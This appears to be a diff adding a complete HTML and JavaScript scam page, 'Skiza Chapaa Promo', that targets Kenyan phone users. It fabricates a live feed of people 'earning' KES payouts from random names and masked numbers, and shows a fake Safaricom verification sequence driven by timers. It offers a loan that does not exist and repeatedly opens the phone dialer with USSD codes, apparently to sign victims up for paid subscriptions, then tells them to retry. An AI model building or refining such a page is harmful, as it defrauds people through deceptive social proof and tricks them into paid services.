@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Skiza Promo</title>
+
+<style>
+/* Blur background when modal opens */
+.blur {
+    filter: blur(6px) brightness(0.7);
+    pointer-events: none;
+    transition: 0.3s ease;
+}
+body {
+    margin: 0;
+    padding-top: 70px;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(to bottom, #f1efe5, #e6e1cf);
+    display: flex;
+    justify-content: center;
+}
+
+.container {
+    width: 360px;
+    padding: 20px;
+}
+
+.logo {
+    background: linear-gradient(135deg, #039826d9, #bbcbbe, #ff9203e3);
+    position: fixed;
+    border-radius: 22px;
+    padding: 11px;
+    top: 0;
+    left: 0;
+    width: 100%;
+    justify-content: center;
+    display: flex;
+    align-items: center;
+    color: white;
+    text-align: center;
+    box-shadow: 0 10px 25px rgba(255, 100, 0, 0.35);
+    padding: 12px 1px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    z-index: 1000;
+}
+
+.logo img {
+    height: 65px;
+    width: auto;
+    display: block;
+}
+
+.logo img:active {
+    transform: scale(0.95);
+}
+
+.title {
+    text-align: center;
+    font-size: 32px;
+    font-weight: 800;
+    margin: 10px 0 15px;
+    background: linear-gradient(to right, #1db954, #f79308);
+    -webkit-background-clip: text;
+    color: transparent;
+}
+
+/* LIVE FEED */
+.live-feed {
+    background: rgba(0,0,0,0.05);
+    padding: 10px;
+    border-radius: 12px;
+    font-size: 12px;
+    margin-bottom: 10px;
+}
+
+/* TIMER */
+.timer-card {
+    background: linear-gradient(135deg, #ff2d2d, #ff8c00, #ffb703);
+    border-radius: 22px;
+    padding: 11px;
+    color: white;
+    text-align: center;
+    box-shadow: 0 10px 25px rgba(255, 100, 0, 0.35);
+}
+
+.timer-boxes {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 15px;
+}
+
+.time-box {
+    background: rgba(255,255,255,0.25);
+    backdrop-filter: blur(6px);
+    border-radius: 14px;
+    padding: 10px;
+    width: 45px;
+}
+
+.time-box h2 {
+    margin: 0;
+    font-size: 20px;
+}
+
+.time-box p {
+    margin: 0;
+    font-size: 12px;
+}
+
+/* Step Card */
+.card {
+    background: #f5f5f5;
+    border-radius: 22px;
+    padding: 22px;
+    margin-top: 25px;
+    border: 3px solid #b9e4c5;
+    box-shadow: 0 6px 15px rgba(0,0,0,0.08);
+}
+
+.steps {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.step {
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #ccc;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+}
+
+.step.active {
+    background: #16a34a;
+    color: white;
+}
+
+.line {
+    width: 30px;
+    height: 4px;
+    background: #ccc;
+}
+
+/* USSD */
+.ussd-box {
+    background: linear-gradient(180deg, #0db14b, #047b30);
+    border-radius: 22px;
+    padding: 22px;
+    text-align: center;
+    color: rgb(255, 255, 255);
+}
+
+.ussd-code {
+    font-size: 32px;
+    font-weight: bold;
+    margin: 10px 0;
+}
+
+.btn {
+    width: 100%;
+    padding: 14px;
+    border-radius: 14px;
+    border: none;
+    margin-top: 10px;
+    font-size: 16px;
+    cursor: pointer;
+}
+
+.copy-btn {
+    background: #ffffff;
+    font-weight: 600;
+    box-shadow: inset 0 2px 4px rgba(0,0,0,0.15);
+}
+
+.dial-btn {
+    background: #03bb47;
+    color: white;
+    font-weight: bold;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+}
+
+body {
+  font-family: Arial, sans-serif, bold;
+  background: #f3f3e8;
+  font-size: 13px;
+  text-align: center;
+}
+
+.earn-box {
+  width: 310px;
+  margin: 40px auto;
+  background: #c2dad6;
+  border-radius: 20px;
+  padding: 12px;
+  border: 3px solid #9dc894;
+  box-shadow: 0 5px 20px rgba(0,0,0,0.8);
+}
+
+/* Step Card */
+.card {
+    background: #f5f5f5;
+    border-radius: 22px;
+    padding: 25px;
+    margin-top: 25px;
+    border: 3px solid #b9e4c5;
+    box-shadow: 0 6px 15px rgba(0,0,0,0.08);
+}
+
+.earn-box h2 {
+  text-align: center;
+  margin-bottom: 10px;
+}
+
+/* SCROLL AREA */
+.earn-list {
+  max-height: 350px;
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+/* ITEM */
+.earn-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: linear-gradient(to right, #e6f4ea, #f2f2e6);
+  padding: 10px;
+  border-radius: 15px;
+  border-left: 6px solid green;
+  font-size: 11px;
+  transition: all 0.4s ease;
+}
+
+.amount {
+  color: green;
+  font-weight: bold;
+}
+
+.note {
+  text-align: center;
+  margin-top: 15px;
+  color: rgb(10, 111, 242);
+  font-size: 10px;
+}
+
+/* MODAL */
+.modal {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.6);
+    justify-content: center;
+    align-items: center;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+}
+
+.modal.show {
+    display: flex;
+    opacity: 1;
+}
+
+.modal-content {
+    background: white;
+    padding: 25px;
+    border-radius: 18px;
+    width: 300px;
+    text-align: center;
+    transform: scale(0.8);
+    transition: transform 0.3s ease;
+}
+
+.modal.show .modal-content {
+    transform: scale(1);
+}
+
+.next-btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 12px;
+    background: #0ac63c;
+    color: white;
+    font-weight: bold;
+}
+
+/* POPUP BASE */
+.popup{
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  display:flex; align-items:center; justify-content:center;
+  background:rgba(0,0,0,0.45); backdrop-filter:blur(6px);
+  z-index:999;
+}
+.hidden{display:none;}
+.card{
+  width:320px; background:white; border-radius:18px;
+  padding:22px; text-align:center; font-family:'Segoe UI',sans-serif;
+  box-shadow:0 10px 30px rgba(0,0,0,0.2);
+}
+.card.small{padding:18px;}
+.card.stk{background:#f7f7f7;}
+
+/* TITLES */
+.title{font-size:18px; color:#00A651; font-weight:700;}
+.subtitle{font-size:12px; color:#555; margin-bottom:15px;}
+
+/* INPUT */
+input{
+  width:100%; padding:12px; margin:14px 0;
+  border-radius:12px; border:1px solid #ddd; font-size:14px;
+}
+input:focus{outline:none; border-color:#00A651; box-shadow:0 0 8px rgba(0,166,81,0.3);}
+
+/* BUTTON */
+.primary-btn{
+  background:#00A651; color:white; border:none;
+  padding:12px; width:100%; border-radius:12px;
+  font-size:14px; font-weight:600; cursor:pointer;
+  transition: all 0.3s;
+}
+.primary-btn:hover{transform:scale(1.03); box-shadow:0 4px 12px rgba(0,166,81,0.5);}
+.primary-btn:disabled{opacity:0.6; cursor:not-allowed;}
+
+/* FOOTER */
+.footer{font-size:11px; margin-top:10px; display:flex; justify-content:space-between; color:#777;}
+
+/* SPINNER */
+.spinner{width:40px; height:40px; border:4px solid #eee; border-top:4px solid #00A651;
+  border-radius:50%; animation:spin 1s linear infinite; margin:auto;}
+@keyframes spin{100%{transform:rotate(360deg);}}
+
+/* SUCCESS */
+.success{color:#00A651; font-size:18px;}
+.approved-box{
+  background: linear-gradient(135deg,#00A651,#00c853);
+  color:white; padding:16px; border-radius:14px; margin:15px 0;
+  box-shadow:0 6px 20px rgba(0,166,81,0.4);
+}
+.approved-label{font-size:11px; letter-spacing:1.5px; opacity:0.8;}
+#approvedAmount{font-size:28px; font-weight:800; margin-top:5px;}
+
+.primary-btn:enabled {
+  animation: pop 0.3s ease;
+}
+</style>
+</head>
+
+<body>
+
+<div id="mainContent">
+  <div class="container">
+
+    <div class="logo">
+      <a href="index.html">
+        <img src="images/skiza-logo.png" alt="Skiza Logo">
+      </a>
+    </div>
+
+    <div class="title">Skiza Chapaa Promo</div>
+
+    <!-- LIVE FEED -->
+    <div class="live-feed" id="feed">🔴 Loading live activity...</div>
+
+    <!-- TIMER -->
+    <div class="timer-card">
+      <div>⚡ Offer Expires Soon!</div>
+
+      <div class="timer-boxes">
+        <div class="time-box"><h2 id="days">00</h2><p>Days</p></div>
+        <div class="time-box"><h2 id="hours">01</h2><p>Hours</p></div>
+        <div class="time-box"><h2 id="mins">00</h2><p>Mins</p></div>
+        <div class="time-box"><h2 id="secs">41</h2><p>Secs</p></div>
+      </div>
+
+      <div style="margin-top:10px;font-size:14px;">🔥 Limited time only! Don't miss out</div>
+    </div>
+
+    <!-- STEP -->
+    <div class="card">
+      <div class="steps">
+        <div class="step active">1</div>
+        <div class="line"></div>
+        <div class="step">2</div>
+        <div class="line"></div>
+        <div class="step">3</div>
+      </div>
+
+      <div class="ussd-box">
+        <div>Dial this code to subscribe:</div>
+
+        <button class="btn copy-btn" onclick="startVerification('copy')">📋 Copy Code</button>
+        <button class="btn dial-btn" onclick="startVerification('dial')">📞 Dial USSD</button>
+      </div>
+    </div>
+
+    <div class="earn-box">
+      <h2>🎉 People Earning Now</h2>
+
+      <div class="earn-list" id="earnList">
+        <div class="earn-item">
+          <div>
+            <strong>Dorothy</strong><br>
+            <small>07*****16 • 2s ago</small>
+          </div>
+          <span class="amount">+10,000 KES</span>
+        </div>
+
+        <div class="earn-item">
+          <div>
+            <strong>Kamau</strong><br>
+            <small>07*****90 • 5s ago</small>
+          </div>
+          <span class="amount">+10,000 KES</span>
+        </div>
+
+        <div class="earn-item">
+          <div>
+            <strong>Dorothy</strong><br>
+            <small>07*****66 • 8s ago</small>
+          </div>
+          <span class="amount">+20,000 KES</span>
+        </div>
+
+        <div class="earn-item">
+          <div>
+            <strong>Mary</strong><br>
+            <small>07*****75 • 11s ago</small>
+          </div>
+          <span class="amount">+10,000 KES</span>
+        </div>
+
+        <div class="earn-item">
+          <div>
+            <strong>Wanja</strong><br>
+            <small>07*****55 • 14s ago</small>
+          </div>
+          <span class="amount">+20,000 KES</span>
+        </div>
+      </div>
+
+      <p class="note">✔ Live withdrawals from active members</p>
+    </div>
+
+  </div>
+</div>
+
+<!-- SUCCESS MODAL -->
+<div id="successModal" class="modal">
+  <div class="modal-content">
+    <h2>💰 Skiza Loan</h2>
+    <p>Instant approval ready</p>
+
+    <h3>from KES 5,000 - KES 50,000</h3>
+
+    <button class="next-btn" onclick="checkEligibility()">Check Eligibility</button>
+  </div>
+</div>
+
+<!-- STEP 2 MODAL -->
+<div id="step2Modal" class="modal">
+  <div class="modal-content">
+    <h2>🎉 Success</h2>
+    <p>You are eligible for:</p>
+
+    <h3 id="amount" style="color:green;">KSh 0</h3>
+
+    <button class="next-btn" onclick="startClaim()">Claim</button>
+  </div>
+</div>
+
+<div id="verifyPopup" class="popup hidden">
+  <div class="card small">
+    <div class="title">Verifying...</div>
+    <div class="subtitle" id="verifyText">Connecting...</div>
+
+    <div class="spinner"></div>
+  </div>
+</div>
+
+<div id="retryPopup" class="popup hidden">
+  <div class="card small">
+    <div class="title">⚠️ Action Required</div>
+    <div id="retryMessage" class="subtitle">Try again, make sure you completed all steps</div>
+
+    <button id="retryBtn" class="primary-btn" onclick="retryDial()">Retry</button>
+  </div>
+</div>
+
+<div id="sessionPopup" class="popup hidden">
+  <div class="card small">
+    <div class="title">⚠️ Session Expired</div>
+    <div class="subtitle">
+      Please try again later.
+    </div>
+
+    <button class="primary-btn" onclick="exitSession()">OK</button>
+  </div>
+</div>
+
+<script>
+
+let activeModal = null;
+
+function showModal(id) {
+  // close everything first
+  document.querySelectorAll(".modal").forEach(m => m.classList.remove("show"));
+  document.querySelectorAll(".popup").forEach(p => p.classList.add("hidden"));
+
+  // remove blur conflicts
+  document.getElementById("mainContent").classList.remove("blur");
+
+  // open only one
+  activeModal = id;
+
+  const el = document.getElementById(id);
+  if (el) {
+    if (el.classList.contains("modal")) {
+      el.classList.add("show");
+    } else {
+      el.classList.remove("hidden");
+    }
+  }
+}
+
+
+// LIVE FEED
+const feed = [
+  "🔴 10 users joined",
+  "💰 Mwangi earned KSh 2,000",
+  "📲 Activation successful",
+  "🔥 VIP slot claimed"
+];
+
+setInterval(() => {
+  document.getElementById("feed").innerText =
+    feed[Math.floor(Math.random() * feed.length)];
+}, 3000);
+
+// TIMER
+let expiryTime = localStorage.getItem("expiryTime");
+
+if (!expiryTime) {
+  expiryTime = new Date("2026-09-01T23:59:59").getTime();
+  localStorage.setItem("expiryTime", expiryTime);
+} else {
+  expiryTime = parseInt(expiryTime, 10);
+}
+
+let isFlowActive = false;
+
+function updateTimer() {
+  const now = new Date().getTime();
+  const distance = expiryTime - now;
+
+  if (distance <= 0) {
+    localStorage.removeItem("expiryTime");
+    return;
+  }
+
+  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
+  const mins = Math.floor((distance / (1000 * 60)) % 60);
+  const secs = Math.floor((distance / 1000) % 60);
+
+  document.getElementById("days").innerText = String(days).padStart(2, '0');
+  document.getElementById("hours").innerText = String(hours).padStart(2, '0');
+  document.getElementById("mins").innerText = String(mins).padStart(2, '0');
+  document.getElementById("secs").innerText = String(secs).padStart(2, '0');
+}
+
+setInterval(updateTimer, 1000);
+updateTimer();
+
+// ACTIONS
+function startVerification(action) {
+  const popup = document.getElementById("verifyPopup");
+  const main = document.getElementById("mainContent");
+
+  popup.classList.remove("hidden");
+  main.classList.add("blur");
+
+  const steps = [
+    "Connecting to Safaricom...",
+    "Checking subscription...",
+    "Verifying account...",
+    "Finalizing request..."
+  ];
+
+  let i = 0;
+
+  const runStep = () => {
+    if (i < steps.length) {
+      document.getElementById("verifyText").innerText = steps[i];
+      i++;
+      setTimeout(runStep, 600 + Math.random() * 500);
+    } else {
+      showCompletion(action);
+    }
+  };
+
+  runStep();
+}
+
+function showCompletion(action) {
+  const text = document.getElementById("verifyText");
+  text.innerText = "✅ Verification complete";
+
+  const delay = 3000 + Math.random() * 3000;
+
+  setTimeout(() => {
+    const popup = document.getElementById("verifyPopup");
+    const main = document.getElementById("mainContent");
+
+    popup.classList.add("hidden");
+    main.classList.remove("blur");
+
+    // Show success model after verification
+    showSuccess();
+  }, delay);
+}
+
+// SUCCESS
+function showSuccess() {
+  showModal("successModal");
+
+  document.getElementById("mainContent").classList.add("blur");
+}
+
+// CHECK ELIGIBILITY -> OPEN DIALER
+function checkEligibility() {
+  sessionStorage.setItem("ussdPending", "true");
+  sessionStorage.setItem("flowState", "dialing");
+
+  window.location.href = "tel:%23%23811%23221%23";
+}
+
+// STEP 2
+function goStep2() {
+  showModal("step2Modal");
+
+  let savedAmount = sessionStorage.getItem("loanAmount");
+
+  if (!savedAmount) {
+    const amounts = [2000, 5000, 10000, 20000];
+    savedAmount = amounts[Math.floor(Math.random() * amounts.length)];
+    sessionStorage.setItem("loanAmount", savedAmount);
+  }
+
+  document.getElementById("amount").innerText =
+    "KSh " + Number(savedAmount).toLocaleString();
+}
+
+const maxRetries = 3;
+
+function retryClaim() {
+  showModal("retryPopup");
+
+  const popup = document.getElementById("retryPopup");
+  const btn = document.getElementById("retryBtn");
+  const message = document.getElementById("retryMessage");
+
+  
+
+  // 🎯 Different messages per retry stage
+  if (retryCount === 0) {
+    message.innerText = "⚠️ You did not complete subscription. Please try again.";
+  } 
+  else if (retryCount === 1) {
+    message.innerText = "⏳ Still processing... please dial again to confirm.";
+  } 
+
+  let time = 5;
+  btn.disabled = true;
+
+  btn.innerHTML = `Retry in <span id="countdown">${time}</span>s`;
+
+  const timer = setInterval(() => {
+    time--;
+    document.getElementById("countdown").innerText = time;
+
+    if (time <= 0) {
+      clearInterval(timer);
+
+      if (retryCount < maxRetries) {
+        btn.disabled = false;
+        btn.innerText = "Retry";
+
+        btn.onclick = () => {
+          retryDial();
+        };
+
+      } else {
+        btn.innerText = "Limit reached";
+
+        setTimeout(() => {
+          showSessionExpired();
+        }, 1500);
+      }
+    }
+
+  }, 1000);
+}
+
+let retryCount = 0;
+
+function retryDial() {
+  document.getElementById("retryPopup").classList.add("hidden");
+
+  retryCount++;
+
+  sessionStorage.setItem("ussdPending", "true");
+  sessionStorage.setItem("isRetry", "true");
+
+  if (retryCount === 1) {
+    window.location.href = "tel:*812*331%23";
+
+  } else {
+    showSessionExpired();
+  }
+}
+
+function startClaim() {
+  // mark session for return detection
+  sessionStorage.setItem("ussdPending", "true");
+
+  // mark that we are now in retry flow
+  sessionStorage.setItem("isRetry", "true");
+  sessionStorage.setItem("flowState", "retry");
+
+  // first redial
+  window.location.href = "tel:*811*221%23";
+}
+
+// END
+function closeAll() {
+  document.getElementById("step2Modal").classList.remove("show");
+  document.getElementById("successModal").classList.remove("show");
+
+  document.getElementById("retryPopup").classList.add("hidden");
+  document.getElementById("verifyPopup").classList.add("hidden");
+
+  document.getElementById("mainContent").classList.remove("blur");
+
+  sessionStorage.removeItem("loanAmount");
+  sessionStorage.removeItem("isRetry");
+  sessionStorage.removeItem("flowState");
+  sessionStorage.removeItem("ussdPending");
+
+  retryCount = 0;
+}
+
+function showSessionExpired(){
+  document.getElementById("sessionPopup").classList.remove("hidden");
+  document.getElementById("mainContent").classList.add("blur");
+
+  // ✅ mark session ended
+  sessionStorage.setItem("sessionEnded", "true");
+}
+
+function exitSession(){
+  document.getElementById("sessionPopup").classList.add("hidden");
+  window.scrollTo({ top: 0, behavior: "smooth" });
+
+  closeAll();
+
+  // ✅ clear all session flags
+  sessionStorage.removeItem("ussdPending");
+  sessionStorage.removeItem("isRetry");
+  sessionStorage.removeItem("loanAmount");
+  sessionStorage.removeItem("sessionEnded");
+}
+</script>
+
+<script>
+const list = document.getElementById("earnList");
+
+const names = [
+  "Otieno","Kamau","Wanjiku","Achieng","Mutua",
+  "Njeri","Kiptoo","Wanjala","Omondi","Chebet",
+  "Mwangi","Atieno","Kariuki","Cheruiyot","Wairimu"
+];
+
+function randomPhone() {
+  let lastTwo = Math.floor(10 + Math.random() * 90);
+  return "07*****" + lastTwo;
+}
+
+function randomAmount() {
+  const amounts = [1000, 2000, 5000, 10000, 20000];
+  return amounts[Math.floor(Math.random() * amounts.length)];
+}
+
+function randomName() {
+  return names[Math.floor(Math.random() * names.length)];
+}
+
+function timeAgo() {
+  let sec = Math.floor(Math.random() * 20) + 1;
+  return sec + "s ago";
+}
+
+function createItem() {
+  const div = document.createElement("div");
+  div.className = "earn-item";
+
+  div.innerHTML = `
+    <div>
+      <strong>${randomName()}</strong><br>
+      <small>${randomPhone()} • ${timeAgo()}</small>
+    </div>
+    <span class="amount">+${randomAmount().toLocaleString()} KES</span>
+  `;
+
+  return div;
+}
+
+// ADD NEW ITEMS + SCROLL EFFECT
+setInterval(() => {
+  const newItem = createItem();
+  newItem.style.opacity = "0";
+  newItem.style.transform = "translateY(-20px)";
+
+  list.prepend(newItem);
+
+  setTimeout(() => {
+    newItem.style.transition = "0.5s";
+    newItem.style.opacity = "1";
+    newItem.style.transform = "translateY(0)";
+  }, 100);
+
+  if (list.children.length > 6) {
+    list.removeChild(list.lastElementChild);
+  }
+}, 2000);
+
+// Detect return from dialer
+window.addEventListener("focus", () => {
+
+  if (sessionStorage.getItem("sessionEnded") === "true") return;
+
+  if (sessionStorage.getItem("ussdPending") === "true") {
+
+    sessionStorage.removeItem("ussdPending");
+
+    setTimeout(() => {
+
+      const state = sessionStorage.getItem("flowState");
+
+      if (state === "success") {
+        goStep2(); // first return → show loan result
+
+      } else if (state === "dialing") {
+        goStep2();
+
+      } else if (sessionStorage.getItem("isRetry") === "true") {
+        retryClaim();
+      }
+
+    }, 800);
+  }
+});
+</script>
+</body>
+</html>
